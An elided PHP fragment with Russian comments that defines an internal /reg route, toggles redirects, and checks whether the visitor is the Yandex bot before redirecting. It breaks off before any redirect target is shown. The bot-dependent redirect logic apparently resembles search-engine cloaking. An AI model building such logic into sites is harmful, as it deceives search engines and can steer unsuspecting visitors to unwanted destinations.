...
/* =========================
   0) ВНУТРЕННИЙ /reg и /reg/*  (работает ВСЕГДА, независимо от $redirect_enabled)
...
if (preg_match('~^/reg(?:/.*)?$~i', $reqPath)) {
  ...
  // Если вообще ничего не задано — просто отдадим контент сайта
  // (никаких exit/redirect)
}
...
if (empty($redirect_enabled)) {
  ...
  // (Маршрут /reg выше уже обработан.)
  return;
}
...
/* =========================
   3) ПРОВЕРКА ЯНДЕКСА + РЕДИРЕКТЫ (как в исходном коде)
   ========================= */
$doRedirect = true;
if (isYandexBot()) {
  $ip = get_ip_();
